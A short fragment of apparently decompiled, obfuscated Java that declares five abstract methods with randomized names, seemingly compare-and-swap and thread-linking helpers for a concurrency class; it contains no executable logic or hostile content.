    public abstract boolean Ee8d2j4S9Vm5yGuR(O2DHNSIGZlgPja7eqLgn o2DHNSIGZlgPja7eqLgn, rCHnHJBAlOpNI5 rchnhjbalopni5, rCHnHJBAlOpNI5 rchnhjbalopni6);

    public abstract void J0zjQ7CAgohuxU20eCW6(rCHnHJBAlOpNI5 rchnhjbalopni5, Thread thread);

    public abstract boolean JXn4Qf7zpnLjP5(O2DHNSIGZlgPja7eqLgn o2DHNSIGZlgPja7eqLgn, Object obj, Object obj2);

    public abstract void nQilHWaqS401ZtR(rCHnHJBAlOpNI5 rchnhjbalopni5, rCHnHJBAlOpNI5 rchnhjbalopni6);

    public abstract boolean vekpFI4d1Nc4fakF(O2DHNSIGZlgPja7eqLgn o2DHNSIGZlgPja7eqLgn, EWUjsTERgdPbSw3NNlN eWUjsTERgdPbSw3NNlN, EWUjsTERgdPbSw3NNlN eWUjsTERgdPbSw3NNlN2);
}
